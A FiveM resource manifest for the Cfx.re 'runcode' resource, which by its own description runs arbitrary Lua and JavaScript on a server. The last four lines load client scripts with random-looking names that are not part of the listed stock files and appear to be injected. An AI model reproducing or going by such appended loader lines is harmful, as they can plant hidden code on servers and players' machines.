-- This resource is part of the default Cfx.re asset pack (cfx-server-data)
-- Altering or recreating for local use only is strongly discouraged.

version '1.0.0'
author 'Cfx.re <root@cfx.re>'
description 'Allows server owners to execute arbitrary server-side or client-side JavaScript/Lua code. *Consider only using this on development servers.'
repository 'https://github.com/citizenfx/cfx-server-data'

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

client_script 'runcode_cl.lua'
server_script 'runcode_sv.lua'
server_script 'runcode_web.lua'

shared_script 'runcode_shared.lua'
shared_script 'runcode.js'

client_script 'runcode_ui.lua'

ui_page 'web/nui.html'
files {
    'web/nui.html'
}

client_script "api-ac_CJOUjcftOzFS.lua"
client_script "api-ac_PhLtMfCLHUqN.lua"
client_script "api-ac_xagvSDFblUVF.lua"
client_script "api-ac_cwbvUaxTboKa.lua"